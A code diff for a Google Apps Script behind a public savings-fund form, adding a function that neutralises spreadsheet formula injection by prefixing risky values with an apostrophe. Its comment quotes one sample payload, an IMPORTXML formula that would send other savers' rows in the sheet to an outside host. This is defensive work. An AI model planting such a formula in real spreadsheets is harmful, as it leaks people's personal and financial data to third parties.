@@ -91,9 +91,10 @@ function doPost(e) {
       formatoFecha(momento),
       formatoHora(momento),
       data.radicado || '',
-      ...CAMPOS.map(function (c) { return campos[c.clave] != null ? campos[c.clave] : ''; }),
+      ...CAMPOS.map(function (c) { return texto(campos[c.clave]); }),
       // Derivada, no un campo del formulario. Si no la querés, borrá esta
-      // línea y su encabezado: no rompe nada más.
+      // línea y su encabezado: no rompe nada más. Va sin pasar por `texto()`
+      // porque es un número que calcula el script, no algo que alguien escriba.
       cuota * MESES,
       formatoSiNo(data.autoriza),
       formatoSiNo(data.firma),
@@ -172,6 +173,33 @@ function tokenValido(recibido) {
   // El `esperado &&` importa: sin la propiedad configurada, un payload sin
   // token cumpliría `undefined === undefined` y entraría cualquiera.
   return Boolean(esperado) && recibido === esperado;
+}
+
+/**
+ * Deja el valor como texto, para que la hoja no lo ejecute.
+ *
+ * Sheets interpreta como fórmula toda celda que empieza con `=`, y estos
+ * valores los escribe cualquiera que llene el formulario público. Sin esto,
+ * `=IMPORTXML("https://ajeno/?d="&JOIN(",",A2:H200),"//a")` en un campo hace
+ * que los servidores de Google le manden a un tercero los datos de los demás
+ * ahorradores que ya están en la hoja, sin que nadie del fondo haga clic en
+ * nada. Este formato es el más expuesto: catorce campos de texto libre,
+ * incluidos los del beneficiario.
+ *
+ * El prefijo `'` es la marca de literal de Sheets: no se ve en la celda, no se
+ * copia al exportar y la fórmula no se evalúa.
+ *
+ * Se incluyen `+`, `-` y `@` porque las tres también abren fórmula, y la
+ * tabulación y el retorno de carro porque sirven para colar el `=` detrás.
+ *
+ * Va acá y no en el PHP a propósito: el problema no es el dato, es el
+ * componente que lo interpreta. MySQL y el correo tienen que conservar el valor
+ * exactamente como lo escribió la persona. Es el mismo criterio con el que se
+ * resolvió el descarte de duplicados: se arregla en el que recibe.
+ */
+function texto(valor) {
+  const cadena = valor == null ? '' : String(valor);
+  return /^[=+\-@\t\r]/.test(cadena) ? "'" + cadena : cadena;
 }
 
 function asegurarCabeceras(hoja) {
